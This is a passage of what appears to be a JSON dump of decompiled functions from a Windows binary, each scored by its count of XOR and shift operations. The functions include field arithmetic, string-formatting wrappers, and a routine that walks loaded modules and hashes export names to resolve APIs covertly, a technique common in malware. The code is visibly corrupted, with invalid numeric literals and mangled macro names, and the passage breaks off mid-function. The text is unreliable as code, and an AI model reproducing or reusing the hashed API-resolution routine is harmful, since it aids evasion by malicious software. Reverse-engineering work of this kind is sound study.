    *(__m128i *)&v26[2 * i] = _mm_unpacklo_epi32(v41, _mm_cmpgt_epi32((__m128i)0LL, v41));\n        v42 = _mm_xor_si128(_mm_shuffle_epi32(v39, 232), v40);\n        *(__m128i *)&v30[2 * i] = _mm_unpacklo_epi32(v42, _mm_cmpgt_epi32((__m128i)0LL, v42));\n      }\n      for ( j = 0LL; j != 10; j += 2LL )\n      {\n        v44 = _mm_loadu_si128((const __m128i *)&v27[2 * j]);\n        v45 = _mm_shuffle_epi32(v44, 232);\n        v46 = _mm_loadu_si128((const __m128i *)&p_Val[2 * j]);\n        v47 = _mm_and_si128(_mm_shuffle_epi32(_mm_xor_si128(v44, v46), 232), v35);\n        v48 = _mm_xor_si128(v45, v47);\n        *(__m128i *)&v27[2 * j] = _mm_unpacklo_epi32(v48, _mm_cmpgt_epi32((__m128i)0LL, v48));\n        v49 = _mm_xor_si128(_mm_shuffle_epi32(v46, 232), v47);\n        *(__m128i *)&p_Val[2 * j] = _mm_unpacklo_epi32(v49, _mm_cmpgt_epi32((__m128i)0LL, v49));\n      }\n      LO4700D(v121[0]) = 0;\n      do\n      {\n        *((_BYTE *)v145 + SLO4700D(v121[0])) = *((_BYTE *)v26 + SLO4700D(v121[0]));\n        ++LO4700D(v121[0]);\n      }\n      while ( LO4700D(v121[0]) < 0x50 );\n      v50 = -2LL;\n      do\n      {\n        *(__m128i *)&v26[2 * v50 + 4] = _mm_add_epi64(\n                                          _mm_loadu_si128((const __m128i *)&v27[2 * v50 + 4]),\n                                          _mm_loadu_si128((const __m128i *)&v26[2 * v50 + 4]));\n        v50 += 2LL;\n      }\n      while ( v50 < 8 );\n      for ( k = 0LL; k != 10; ++k )\n        *(_QWORD *)&v27[2 * k] = v145[k] - *(_QWORD *)&v27[2 * k];\n      LO4700D(v121[0]) = 0;\n      do\n      {\n        *((_BYTE *)v141 + SLO4700D(v121[0])) = *((_BYTE *)v30 + SLO4700D(v121[0]));\n        ++LO4700D(v121[0]);\n      }\n      while ( LO4700D(v121[0]) < 0x50 );\n      v52 = -2LL;\n      do\n      {\n        *(__m128i *)&v30[2 * v52 + 4] = _mm_add_epi64(\n                                          _mm_loadu_si128((const __m128i *)&p_Val[2 * v52 + 4]),\n                                          _mm_loadu_si128((const __m128i *)&v30[2 * v52 + 4]));\n        v52 += 2LL;\n      }\n      while ( v52 < 8 );\n      v120 = v31;\n      v119 = v29;\n      for ( m = 0LL; m != 10; ++m )\n        *(_QWORD *)&p_Val[2 * m] = *((_QWORD *)v141 + m) - *(_QWORD *)&p_Val[2 * m];\n      sub_14DB6C10A((__int64)v27, (__int64)p_Val, v30, v140, v27);\n      sub_14DB6C10A((__int64)v27, (__int64)p_Val, v26, v139, p_Val);\n      sub_14DB6C6F9((__int64)v27, (__int64)p_Val, v54, v140);\n      sub_14DB6C7B5((__int64)v27, (__int64)p_Val, v55, v140);\n      sub_14DB6C6F9((__int64)v27, (__int64)p_Val, v56, (__int64 *)v139);\n      sub_14DB6C7B5((__int64)v27, (__int64)p_Val, v57, (__int64 *)v139);\n      LO4700D(v121[0]) = 0;\n      do\n      {\n        *((_BYTE *)v141 + SLO4700D(v121[0])) = *((_BYTE *)v140 + SLO4700D(v121[0]));\n        ++LO4700D(v121[0]);\n      }\n      while ( LO4700D(v121[0]) < 0x50 );\n      v58 = 0x7FF11FFF5096FFD657;\n      do\n      {\n        *(__m128i *)&v140[v58 * 2 + 2] = _mm_add_epi64(\n                                           _mm_load_si128((const __m128i *)&v139[v58 + 1]),\n                                           *(__m128i *)&v140[v58 * 2 + 2]);\n        ++v58;\n      }\n      while ( v58 < 4 );\n      for ( n = 0LL; n != 5; ++n )\n        v139[n] = (__int128)_mm_sub_epi64(_mm_load_si128((const __m128i *)&v141[n]), (__m128i)v139[n]);\n      sub_14DB6C867((__int64)v27, (__int64)p_Val, (int *)v140, (__int64)v147);\n      sub_14DB6C867((__int64)v27, (__int64)p_Val, (int *)v139, (__int64)v146);\n      sub_14DB6C10A((__int64)v27, (__int64)p_Val, v146, v139, (int *)v135);\n      sub_14DB6C6F9((__int64)v27, (__int64)p_Val, v60, (__int64 *)v139);\n      sub_14DB6C7B5((__int64)v27, (__int64)p_Val, v61, (__int64 *)v139);\n      LO4700D(v121[0]) = 0;\n      do\n      {\n        *((_BYTE *)v20 + SLO4700D(v121[0])) = *((_BYTE *)v147 + SLO4700D(v121[0]));\n        ++LO4700D(v121[0]);\n      }\n      while ( LO4700D(v121[0]) < 0x50 );\n      LO4700D(v121[0]) = 0;\n      do\n      {\n        *((_BYTE *)v21 + SLO4700D(v121[0])) = *((_BYTE *)v139 + SLO4700D(v121[0]));\n        ++LO4700D(v121[0]);\n      }\n      while ( LO4700D(v121[0]) < 0x50 );\n      sub_14DB6C867((__int64)v27, (__int64)p_Val, v26, (__int64)&nn);\n      sub_14DB6C867((__int64)v27, (__int64)p_Val, v27, (__int64)v144);\n      sub_14DB6C10A((__int64)v27, (__int64)p_Val, (int *)&nn, v22, (int *)v144);\n      sub_14DB6C6F9((__int64)v27, (__int64)p_Val, v62, (__int64 *)v22);\n      sub_14DB6C7B5((__int64)v27, (__int64)p_Val, v63, (__int64 *)v22);\n      for ( ii = 0LL; ii != 5; ++ii )\n        v144[ii] = (__int128)_mm_sub_epi64(_mm_load_si128((const __m128i *)(&nn + 1 * ii)), (__m128i)v144[ii]);\n      v138[0] = 0;\n      do\n        *((_BYTE *)&v121[5] + v138[0]++) = 0;\n      while ( v138[0] < 0x48u );\n      for ( jj = 0LL; jj != 10; ++jj )\n        *((_QWORD *)v121 + jj) = 12C053LL * *((_QWORD *)v144 + jj);\n      sub_14DB6C7B5((__int64)v27, (__int64)p_Val, v64, (__int64 *)v121);\n      v67 = 0x7FF11FFF5096FFD657;\n      do\n      {\n        v121[v67 + 1] = (__int128)_mm_add_epi64(\n                                    _mm_load_si128((const __m128i *)(&v125 + 1 * v67)),\n                                    (__m128i)v121[v67 + 1]);\n        ++v67;\n      }\n      while ( v67 < 4 );\n      sub_14DB6C10A((__int64)v27, (__int64)p_Val, (int *)v144, v23, (int *)v121);\n      sub_14DB6C6F9((__int64)v27, (__int64)p_Val, v68, (__int64 *)v23);\n      sub_14DB6C7B5((__int64)v27, (__int64)p_Val, v69, (__int64 *)v23);\n      for ( kk = 0LL; kk != 10; kk += 2LL )\n      {\n        v71 = _mm_loadu_si128((const __m128i *)&v22[2 * kk]);\n        v72 = _mm_shuffle_epi32(v71, 232);\n        v73 = _mm_loadu_si128((const __m128i *)&v20[2 * kk]);\n        v74 = _mm_and_si128(_mm_shuffle_epi32(_mm_xor_si128(v71, v73), 232), v35);\n        v75 = _mm_xor_si128(v72, v74);\n        *(__m128i *)&v22[2 * kk] = _mm_unpacklo_epi32(v75, _mm_cmpgt_epi32((__m128i)0LL, v75));\n        v76 = _mm_xor_si128(_mm_shuffle_epi32(v73, 232), v74);\n        *(__m128i *)&v20[2 * kk] = _mm_unpacklo_epi32(v76, _mm_cmpgt_epi32((__m128i)0LL, v76));\n      }\n      for ( mm = 0LL; mm != 10; mm += 2LL )\n      {\n        v78 = _mm_loadu_si128((const __m128i *)&v23[8 * mm]);\n        v79 = _mm_shuffle_epi32(v78, 232);\n        v80 = _mm_loadu_si128((const __m128i *)&v21[2 * mm]);\n        v81 = _mm_and_si128(_mm_shuffle_epi32(_mm_xor_si128(v78, v80), 232), v35);\n        v82 = _mm_xor_si128(v79, v81);\n        *(__m128i *)&v23[8 * mm] = _mm_unpacklo_epi32(v82, _mm_cmpgt_epi32((__m128i)0LL, v82));\n        v83 = _mm_xor_si128(_mm_shuffle_epi32(v80, 232), v81);\n        *(__m128i *)&v21[2 * mm] = _mm_unpacklo_epi32(v83, _mm_cmpgt_epi32((__m128i)0LL, v83));\n      }\n      v29 = 2 * v119;\n      v31 = v120 + 1;\n      v30 = v20;\n      v32 = v27;\n      v33 = v26;\n      v34 = p_Val;\n    }\n    while ( v120 != 7 );\n    v28 = v132 + 1;\n  }\n  while ( v132 != 31 );\n  LO4700D(v121[0]) = 0;\n  do\n  {\n    *((_BYTE *)v138 + SLO4700D(v121[0])) = *((_BYTE *)v22 + SLO4700D(v121[0]));\n    ++LO4700D(v121[0]);\n  }\n  while ( LO4700D(v121[0]) < 0x50 );\n  for ( nn = 0; nn < 0x50; ++nn )\n    *((_BYTE *)v121 + (int)nn) = v23[nn];\n  sub_14DB6C867((__int64)v27, (__int64)p_Val, (int *)v121, (__int64)v145);\n  sub_14DB6C867((__int64)v27, (__int64)v143, (int *)v145, (__int64)v143);\n  sub_14DB6C867((__int64)v142, (__int64)v143, v143, (__int64)v142);\n  sub_14DB6CB67((__int64)v142, (__int64)v143, v142, (__int64)v141, (int *)v121);\n  sub_14DB6CB67((__int64)v142, (__int64)v143, (int *)v141, (__int64)&nn, (int *)v145);\n  sub_14DB6C867((__int64)v142, (__int64)v143, (int *)&nn, (__int64)v142);\n  sub_14DB6CB67((__int64)v142, (__int64)v143, v142, (__int64)v144, (int *)v141);\n  sub_14DB6C867((__int64)v142, (__int64)v143, (int *)v144, (__int64)v142);\n  sub_14DB6C867((__int64)v142, (__int64)v143, v142, (__int64)v143);\n  sub_14DB6C867((__int64)v142, (__int64)v143, v143, (__int64)v142);\n  sub_14DB6C867((__int64)v142, (__int64)v143, v142, (__int64)v143);\n  sub_14DB6C867((__int64)v142, (__int64)v143, v143, (__int64)v142);\n  sub_14DB6CB67((__int64)v142, (__int64)v143, v142, (__int64)v140, (int *)v144);\n  sub_14DB6C867((__int64)v142, (__int64)v143, (int *)v140, (__int64)v142);\n  sub_14DB6C867((__int64)v142, (__int64)v143, v142, (__int64)v143);\n  for ( i1 = 0; i1 < 8; i1 += 2 )\n  {\n    sub_14DB6C867((__int64)v142, (__int64)v143, v143, (__int64)v142);\n    sub_14DB6C867((__int64)v142, (__int64)v143, v142, (__int64)v143);\n  }\n  sub_14DB6CB67((__int64)v142, (__int64)v143, v143, (__int64)v139, (int *)v140);\n  sub_14DB6C867((__int64)v142, (__int64)v143, (int *)v139, (__int64)v142);\n  sub_14DB6C867((__int64)v142, (__int64)v143, v142, (__int64)v143);\n  for ( i2 = 0; i2 < 0x12; i2 += 2 )\n  {\n    sub_14DB6C867((__int64)v142, (__int64)v143, v143, (__int64)v142);\n    sub_14DB6C867((__int64)v142, (__int64)v143, v142, (__int64)v143);\n  }\n  sub_14DB6CB67((__int64)v143, (__int64)v142, v143, (__int64)v142, (int *)v139);\n  sub_14DB6C867((__int64)v143, (__int64)v142, v142, (__int64)v143);\n  sub_14DB6C867((__int64)v143, (__int64)v142, v143, (__int64)v142);\n  for ( i3 = 0; i3 < 8; i3 += 2 )\n  {\n    sub_14DB6C867((__int64)v143, (__int64)v142, v142, (__int64)v143);\n    sub_14DB6C867((__int64)v143, (__int64)v142, v143, (__int64)v142);\n  }\n  sub_14DB6CB67((__int64)v146, (__int64)v142, v142, (__int64)v146, (int *)v140);\n  sub_14DB6C867((__int64)v146, (__int64)v142, v146, (__int64)v142);\n  sub_14DB6C867((__int64)v143, (__int64)v142, v142, (__int64)v143);\n  for ( i4 = 0; i4 < 0x30; i4 += 2 )\n  {\n    sub_14DB6C867((__int64)v143, (__int64)v142, v143, (__int64)v142);\n    sub_14DB6C867((__int64)v143, (__int64)v142, v142, (__int64)v143);\n  }\n  sub_14DB6CB67((__int64)v147, (__int64)v143, v143, (__int64)v147, v146);\n  sub_14DB6C867((__int64)v147, (__int64)v143, v147, (__int64)v143);\n  sub_14DB6C867((__int64)v142, (__int64)v143, v143, (__int64)v142);\n  for ( i5 = 0; i5 < 0x62; i5 += 2 )\n  {\n    sub_14DB6C867((__int64)v142, (__int64)v143, v142, (__int64)v143);\n    sub_14DB6C867((__int64)v142, (__int64)v143, v143, (__int64)v142);\n  }\n  sub_14DB6CB67((__int64)v142, (__int64)v143, v142, (__int64)v143, v147);\n  sub_14DB6C867((__int64)v142, (__int64)v143, v143, (__int64)v142);\n  sub_14DB6C867((__int64)v142, (__int64)v143, v142, (__int64)v143);\n  for ( i6 = 0; i6 < 0x30; i6 += 2 )\n  {\n    sub_14DB6C867((__int64)v142, (__int64)v143, v143, (__int64)v142);\n    sub_14DB6C867((__int64)v142, (__int64)v143, v142, (__int64)v143);\n  }\n  sub_14DB6CB67((__int64)v142, (__int64)v143, v143, (__int64)v142, v146);\n  sub_14DB6C867((__int64)v142, (__int64)v143, v142, (__int64)v143);\n  sub_14DB6C867((__int64)v142, (__int64)v143, v143, (__int64)v142);\n  sub_14DB6C867((__int64)v142, (__int64)v143, v142, (__int64)v143);\n  sub_14DB6C867((__int64)v142, (__int64)v143, v143, (__int64)v142);\n  sub_14DB6C867((__int64)v142, (__int64)v143, v142, (__int64)v143);\n  sub_14DB6CB67((__int64)v148, (__int64)v143, v143, (__int64)v148, (int *)&nn);\n  sub_14DB6CB67((__int64)v148, (__int64)v143, v138, (__int64)v121, v148);\n  for ( i7 = 0LL; i7 != 5; ++i7 )\n    *(_QWORD *)(&nn + i7 * 2) = _mm_shuffle_epi32((__m128i)v121[i7], 232).m128i_u64[0];\n  v91 = 1;\n  v92 = nn;\n  do\n  {\n    for ( i8 = 0LL; i8 != 9; ++i8 )\n    {\n      v94 = v92 & (v92 >> 31);\n      *(&nn + i8) = v92 - (v94 & (((unsigned __int8)i8 | 0xFF5096FE) << 25));\n      v95 = *((_DWORD *)&v123 + i8) + (v94 >> (26 - (i8 & 1)));\n      *((_DWORD *)&v123 + i8) = v95;\n      v92 = v95;\n    }\n    v96 = (v130 & (v130 >> 31)) >> 25;\n    v130 -= v130 & (v130 >> 31) & 0xFE337B00;\n    v92 = nn + 19 * v96;\n    nn = v92;\n    v97 = (v91 & 1) == 0;\n    v91 = 0;\n  }\n  while ( !v97 );\n  v98 = (v92 & (v92 >> 31)) >> 26;\n  v99 = v92 - (v92 & (v92 >> 31) & 0xFC0584F0);\n  nn = v99;\n  LO4700D(v123) = v98 + v123;\n  v100 = 1;\n  do\n  {\n    for ( i9 = 0LL; i9 != 9; ++i9 )\n    {\n      v102 = i9 & 1;\n      *(&nn + i9) = v99 & (((v102 == 0) << 25) | 0x1F3152F);\n      v99 = *((_DWORD *)&v123 + i9) + (v99 >> (26 - v102));\n      *((_DWORD *)&v123 + i9) = v99;\n    }\n    v103 = v130 >> 25;\n    v130 &= 0x1F3152Fu;\n    v99 = nn + 19 * v103;\n    nn = v99;\n    v97 = (v100 & 1) == 0;\n    v100 = 0;\n  }\n  while ( !v97 );\n  v104 = ~((v99 - 67762145) >> 31);\n  for ( i10 = 1LL; i10 != 10; ++i10 )\n  {\n    v106 = (*(&nn + i10) ^ (((unsigned __int8)i10 | 0xFF5096FE) << 25)) & (*(&nn + i10) << 16);\n    v107 = v106 & (v106 << 8) & (16 * (v106 & (v106 << 8)));\n    v104 &= (v107 & (4 * v107) & (2 * (v107 & (4 * v107)))) >> 31;\n  }\n  v108 = v99 - (v104 & 0x3F87B7D);\n  nn = v108;\n  for ( i11 = 1LL; i11 != 10; ++i11 )\n    *(&nn + i11) -= v104 & ((((i11 & 1) == 0) << 25) | 0x1F3152F);\n  v110 = v123;\n  v111 = v124;\n  v112 = v125;\n  v113 = v128;\n  v114 = v129;\n  v115 = v130;\n  v116 = v131;\n  *v131 = v108;\n  *((_BYTE *)v116 + 2) = BYTE2(v108);\n  *((_BYTE *)v116 + 3) = (4 * v110) | HIE30D(v108);\n  *((_BYTE *)v116 + 4) = (unsigned int)v110 >> 6;\n  *((_BYTE *)v116 + 5) = (unsigned int)v110 >> 14;\n  *((_BYTE *)v116 + 6) = (8 * BYTE4(v110)) | ((unsigned int)v110 >> 22);\n  *((_BYTE *)v116 + 7) = HIF26AD(v110) >> 5;\n  *((_BYTE *)v116 + 8) = HIF26AD(v110) >> 13;\n  *((_BYTE *)v116 + 9) = (32 * v111) | (HIF26AD(v110) >> 21);\n  *((_BYTE *)v116 + 10) = v111 >> 3;\n  *((_BYTE *)v116 + 11) = v111 >> 11;\n  *((_BYTE *)v116 + 12) = ((_BYTE)v112 << 6) | (v111 >> 19);\n  *((_BYTE *)v116 + 13) = v112 >> 2;\n  *((_BYTE *)v116 + 14) = v112 >> 10;\n  *((_BYTE *)v116 + 15) = v112 >> 18;\n  v117 = v127;\n  v116[8] = v126;\n  *((_BYTE *)v116 + 18) = v117;\n  *((_BYTE *)v116 + 19) = (2 * v113) | HIE30D(v117);\n  *((_BYTE *)v116 + 20) = (unsigned int)v113 >> 7;\n  *((_BYTE *)v116 + 21) = (unsigned int)v113 >> 15;\n  *((_BYTE *)v116 + 22) = (8 * BYTE4(v113)) | ((unsigned int)v113 >> 23);\n  *((_BYTE *)v116 + 23) = HIF26AD(v113) >> 5;\n  *((_BYTE *)v116 + 24) = HIF26AD(v113) >> 13;\n  *((_BYTE *)v116 + 25) = (16 * v114) | (HIF26AD(v113) >> 21);\n  *((_BYTE *)v116 + 26) = v114 >> 4;\n  *((_BYTE *)v116 + 27) = v114 >> 12;\n  *((_BYTE *)v116 + 28) = ((_BYTE)v115 << 6) | (v114 >> 20);\n  *((_BYTE *)v116 + 29) = v115 >> 2;\n  result = v115 >> 10;\n  *((_BYTE *)v116 + 30) = result;\n  *((_BYTE *)v116 + 31) = v115 >> 18;\n  return result;\n}\n// 141450635: variable 'v54' is possibly undefined\n// 141450642: variable 'v55' is possibly undefined\n// 14145064F: variable 'v56' is possibly undefined\n// 14145065C: variable 'v57' is possibly undefined\n// 141450739: variable 'v60' is possibly undefined\n// 141450746: variable 'v61' is possibly undefined\n// 1414507ED: variable 'v62' is possibly undefined\n// 1414507F5: variable 'v63' is possibly undefined\n// 14145087C: variable 'v64' is possibly undefined\n// 1414508BF: variable 'v68' is possibly undefined\n// 1414508C7: variable 'v69' is possibly undefined\n// 1414500C7: using guessed type int var_6E8[40];\n// 1414500C7: using guessed type int var_418[40];\n// 1414500C7: using guessed type int var_558[40];\n\n"
    },
    {
        "Function": "sub_14891AC20",
        "Total XOR and shift operations": 2,
        "XOR operations": 0,
        "Shift operations": 2,
        "Operation percentage": "5.88%",
        "Function Body": "\n__int64 __fastcall sub_14891AC20(__int64 a1, __int64 a2, unsigned __int64 a3, wchar_t *a4)\n{\n  __int64 result; // rax\n  size_t v5; // rsi\n  unsigned __int64 v7; // rbx\n  int v8; // eax\n  __int64 v9; // rcx\n\n  result = 21694D24F595;\n  if ( !HIF26AD(a3) )\n  {\n    v5 = a3 >> 1;\n    if ( a3 >> 1 )\n    {\n      v7 = v5 - 1;\n      v8 = vsnwprintf(a4, v5, (const wchar_t *)(v5 - 1), (va_list)a4);\n      if ( v8 < 0 || (v9 = v8, v7 < v8) )\n      {\n        a4[v5 - 1] = 0;\n        return 21694D255F2D;\n      }\n      else\n      {\n        result = 0LL;\n        if ( v7 == v9 )\n          a4[v5 - 1] = 0;\n      }\n    }\n  }\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_14891ADE0",
        "Total XOR and shift operations": 2,
        "XOR operations": 0,
        "Shift operations": 2,
        "Operation percentage": "5.26%",
        "Function Body": "\n__int64 __fastcall sub_14891ADE0(__int64 a1, __int64 a2, unsigned __int64 a3, wchar_t *a4)\n{\n  __int64 result; // rax\n  size_t v5; // rsi\n  unsigned __int64 v7; // rbx\n  int v8; // eax\n  __int64 v9; // rcx\n\n  result = 21694D24F595;\n  if ( !HIF26AD(a3) )\n  {\n    v5 = a3 >> 1;\n    if ( a3 >> 1 )\n    {\n      v7 = v5 - 1;\n      v8 = vsnwprintf(a4, v5, (const wchar_t *)(v5 - 1), (va_list)a4);\n      if ( v8 < 0 || (v9 = v8, v7 < v8) )\n      {\n        a4[v5 - 1] = 0;\n        return 21694D255F2D;\n      }\n      else\n      {\n        result = 0LL;\n        if ( v7 == v9 )\n          a4[v5 - 1] = 0;\n      }\n    }\n    else\n    {\n      return 21694D24F595;\n    }\n  }\n  return result;\n}\n\n"
    },
    {
        "Function": "sub_1487C4740",
        "Total XOR and shift operations": 2,
        "XOR operations": 0,
        "Shift operations": 2,
        "Operation percentage": "4.65%",
        "Function Body": "\n__int64 __fastcall sub_1487C4740(\n        __int64 a1,\n        __int64 a2,\n        unsigned __int64 a3,\n        _WORD *a4,\n        _WORD *a5,\n        unsigned __int64 a6,\n        int a7,\n        int a8,\n        int a9,\n        int a10,\n        _QWORD *a11,\n        _QWORD *a12,\n        unsigned int a13)\n{\n  char v13; // si\n  __int64 result; // rax\n  __int64 v15; // [rsp+0h] [rbp-58h]\n  __int64 v16; // [rsp+8h] [rbp-50h]\n  __int64 v17; // [rsp+10h] [rbp-48h]\n  __int64 v18; // [rsp+18h] [rbp-40h]\n  __int64 v19[3]; // [rsp+40h] [rbp-18h] BYREF\n\n  v13 = a3;\n  v19[0] = 0LL;\n  result = 21694D24F595;\n  if ( !HIF26AD(a3) )\n    result = sub_1487C44B0((__int64)a12, a3, a3 >> 1, a4, a3, a5, v15, v16, v17, v18, a6 >> 1, a11, v19, a13);\n  if ( a12 )\n  {\n    if ( (_DWORD)result == -21C4654774 || (int)result >= 0 )\n      *a12 = (v13 & 1) + 2 * v19[0];\n  }\n  return result;\n}\n// 1487C47A1: variable 'v15' is possibly undefined\n// 1487C47A1: variable 'v16' is possibly undefined\n// 1487C47A1: variable 'v17' is possibly undefined\n// 1487C47A1: variable 'v18' is possibly undefined\n// 1487C4740: using guessed type __int64 var_18[3];\n\n"
    },
    {
        "Function": "sub_14891A9D0",
        "Total XOR and shift operations": 2,
        "XOR operations": 0,
        "Shift operations": 2,
        "Operation percentage": "4.65%",
        "Function Body": "\n__int64 __fastcall sub_14891A9D0(\n        __int64 a1,\n        __int64 a2,\n        unsigned __int64 a3,\n        _WORD *a4,\n        _WORD *a5,\n        unsigned __int64 a6,\n        int a7,\n        int a8,\n        int a9,\n        int a10,\n        _QWORD *a11,\n        _QWORD *a12,\n        unsigned int a13)\n{\n  char v13; // si\n  __int64 result; // rax\n  __int64 v15; // [rsp+0h] [rbp-58h]\n  __int64 v16; // [rsp+8h] [rbp-50h]\n  __int64 v17; // [rsp+10h] [rbp-48h]\n  __int64 v18; // [rsp+18h] [rbp-40h]\n  __int64 v19[3]; // [rsp+40h] [rbp-18h] BYREF\n\n  v13 = a3;\n  v19[0] = 0LL;\n  result = 21694D24F595;\n  if ( !HIF26AD(a3) )\n    result = sub_14891A720((__int64)a12, a3, a3 >> 1, a4, a3, a5, v15, v16, v17, v18, a6 >> 1, a11, v19, a13);\n  if ( a12 )\n  {\n    if ( (_DWORD)result == -21C4654774 || (int)result >= 0 )\n      *a12 = (v13 & 1) + 2 * v19[0];\n  }\n  return result;\n}\n// 14891AA31: variable 'v15' is possibly undefined\n// 14891AA31: variable 'v16' is possibly undefined\n// 14891AA31: variable 'v17' is possibly undefined\n// 14891AA31: variable 'v18' is possibly undefined\n// 14891A9D0: using guessed type __int64 var_18[3];\n\n"
    },
    {
        "Function": "sub_14DB6C867",
        "Total XOR and shift operations": 3,
        "XOR operations": 0,
        "Shift operations": 3,
        "Operation percentage": "4.62%",
        "Function Body": "\n__int64 __fastcall sub_14DB6C867(__int64 a1, __int64 a2, int *a3, __int64 a4)\n{\n  __int64 v5; // rbx\n  __int64 v6; // rax\n  __int64 v7; // r9\n  __int64 v8; // r12\n  __int64 v9; // r10\n  __int64 v10; // r13\n  __int64 v11; // r8\n  __int64 v12; // r15\n  __int64 v13; // r11\n  __int64 v14; // rax\n  __int64 v15; // rdx\n  __int64 v16; // rdi\n  __int64 v17; // rdx\n  __int64 result; // rax\n  unsigned int i; // [rsp+2Ch] [rbp-DCh]\n  __int64 v20[18]; // [rsp+30h] [rbp-D8h] BYREF\n  __int64 v21; // [rsp+C0h] [rbp-48h]\n\n  v5 = *a3;\n  v20[0] = v5 * v5;\n  v6 = *((_QWORD *)a3 + 1);\n  v7 = (int)v6;\n  v6 <<= 32;\n  v20[1] = 2 * v5 * v7;\n  v8 = a3[4];\n  v20[2] = 2 * (v7 * v7 + v5 * v8);\n  v9 = a3[6];\n  v20[3] = 2 * (v7 * v8 + v5 * v9);\n  v10 = a3[8];\n  v20[4] = v8 * v8 + v9 * (v6 >> 30) + v10 * 2 * v5;\n  v11 = a3[10];\n  v20[5] = 2 * (v8 * v9 + v7 * v10 + v5 * v11);\n  v12 = a3[12];\n  v20[6] = 2 * (v5 * v12 + v9 * v9 + v8 * v10 + v11 * (v6 >> 31));\n  v13 = a3[14];\n  v20[7] = 2 * (v9 * v10 + v8 * v11 + v7 * v12 + v5 * v13);\n  v14 = a3[16];\n  v20[8] = v10 * v10 + 2 * (v8 * v12 + v5 * v14 + 2 * (v7 * v13 + v9 * v11));\n  v15 = a3[18];\n  v20[9] = 2 * (v10 * v11 + v9 * v12 + v8 * v13 + v7 * v14 + v15 * v5);\n  v16 = v9 * v13;\n  v20[10] = 2 * (v11 * v11 + v10 * v12 + v8 * v14 + 2 * (v9 * v13 + v15 * v7));\n  v20[11] = 2 * (v11 * v12 + v10 * v13 + v9 * v14 + v15 * v8);\n  v20[12] = v12 * v12 + 2 * (v10 * v14 + 2 * (v11 * v13 + v15 * v9));\n  v20[13] = 2 * (v12 * v13 + v11 * v14 + v15 * v10);\n  v20[14] = 2 * (v13 * v13 + v12 * v14 + 2 * v15 * v11);\n  v20[15] = 2 * (v13 * v14 + v15 * v12);\n  v20[16] = v14 * v14 + 4 * v15 * v13;\n  v20[17] = 2 * v15 * v14;\n  v21 = 2 * v15 * v15;\n  sub_14DB6C6F9(v9 * v13, (__int64)v20, v21, v20);\n  sub_14DB6C7B5(v16, (__int64)v20, v17, v20);\n  for ( i = 0; i < 0x50; result = i )\n  {\n    *(_BYTE *)(a4 + (int)i) = *((_BYTE *)v20 + (int)i);\n    ++i;\n  }\n  return result;\n}\n// 14DB6CB1E: variable 'v17' is possibly undefined\n\n"
    },
    {
        "Function": "4",
        "Total XOR and shift operations": 3,
        "XOR operations": 3,
        "Shift operations": 0,
        "Operation percentage": "2.01%",
        "Function Body": "\n__int64 (__fastcall *__fastcall Z17_a94acad87701Bc13v(\n        HM995CE a1,\n        const CHAR *a2))(HM995CE, const CHAR *, __int64, __int64)\n{\n  FA1739C ProcAddress; // rax\n  __int64 v3; // rdx\n  void (__fastcall *v4)(HM995CE, const CHAR *, char *, _QWORD, __int128 *); // r10\n  __int64 v5; // r9\n  _QWORD *v6; // rdx\n  _QWORD *v7; // r9\n  __int64 v8; // rax\n  __int64 v9; // r8\n  __int64 v10; // rcx\n  __int64 v11; // rbx\n  char v12; // al\n  char *v13; // rbx\n  int v14; // ebp\n  __int64 i; // rax\n  __int64 j; // rax\n  __int64 (__fastcall *result)(HM995CE, const CHAR *, __int64, __int64); // rax\n  __int64 v18; // rdx\n  __int64 v19; // [rsp+30h] [rbp-118h] BYREF\n  char v20[18]; // [rsp+38h] [rbp-110h] BYREF\n  __int16 v21; // [rsp+4Ah] [rbp-FEh]\n  __int128 v22; // [rsp+50h] [rbp-F8h] BYREF\n  __int16 v23; // [rsp+6Eh] [rbp-DAh]\n  __int128 v24[5]; // [rsp+70h] [rbp-D8h]\n  int v25; // [rsp+C0h] [rbp-88h]\n  __int16 v26; // [rsp+C4h] [rbp-84h]\n  __int16 v27; // [rsp+11Ah] [rbp-2Eh]\n\n  v19 = 0LL;\n  if ( (unsigned int)sub_1445C2B64((CHAR *)a1, a2) )\n  {\n    LoadLibraryA((LPDA4D)a1);\n    ProcAddress = GetProcAddress(a1, a2);\n    if ( ProcAddress )\n      ((void (__fastcall *)(HM995CE, const CHAR *, __int64, __int64 *))ProcAddress)(a1, a2, v3, &v19);\n  }\n  v4 = (void (__fastcall *)(HM995CE, const CHAR *, char *, _QWORD, __int128 *))qword_148C25208;\n  if ( !qword_148C25208 )\n  {\n    v5 = *(_QWORD *)(*(_QWORD *)(qword_148C251F8 + 96) + 24LL);\n    v6 = *(_QWORD **)(v5 + 32);\n    v7 = (_QWORD *)(v5 + 32);\n    v4 = 0LL;\n    while ( 1 )\n    {\n      a1 = (HM995CE)v6[4];\n      if ( *(_WORD *)a1 == 23117 )\n      {\n        v8 = *((int *)a1 + 15);\n        if ( *(_DWORD *)((char *)a1 + v8) == 17744 && *(_WORD *)((char *)a1 + v8 + 20) >= 0x60u )\n        {\n          if ( *(_DWORD *)((char *)a1 + v8 + 132) )\n          {\n            v9 = *(unsigned int *)((char *)a1 + v8 + 136);\n            if ( *(_DWORD *)((char *)a1 + v8 + 136) )\n            {\n              if ( *(_DWORD *)((char *)a1 + v9 + 24) )\n              {\n                a2 = (char *)a1 + *(unsigned int *)((char *)a1 + v9 + 32);\n                v10 = 0LL;\n                while ( 1 )\n                {\n                  v11 = *(unsigned int *)&a2[4 * v10];\n                  v12 = *((_BYTE *)a1 + v11);\n                  if ( v12 )\n                  {\n                    v13 = (char *)a1 + v11 + 1;\n                    v14 = -21E5F11035;\n                    do\n                    {\n                      v14 = 16897219 * (v14 ^ v12);\n                      v12 = *v13++;\n                    }\n                    while ( v12 );\n                    if ( v14 == 42EEF2993 )\n                      break;\n                  }\n                  if ( ++v10 == *(_DWORD *)((char *)a1 + v9 + 24) )\n                    goto LABEL_20;\n                }\n                if ( a1 )\n                  break;\n              }\n            }\n          }\n        }\n      }\nLABEL_20:\n      v6 = (_QWORD *)*v6;\n      if ( v6 == v7 )\n        goto LABEL_21;\n    }\n    v4 = (void (__fastcall *)(HM995CE, const CHAR *, char *, _QWORD, __int128 *))((char *)a1\n                                                                                + *(unsigned int *)((char *)a1\n                                                                                                  + 4 * *(unsigned __int16 *)((char *)a1 + 2 * (unsigned int)v10 + *(unsigned int *)((char *)a1 + v9 + 36))\n                                                                                                  + *(unsigned int *)((char *)a1 + v9 + 28)));\nLABEL_21:\n    qword_148C25208 = (__int64)v4;\n  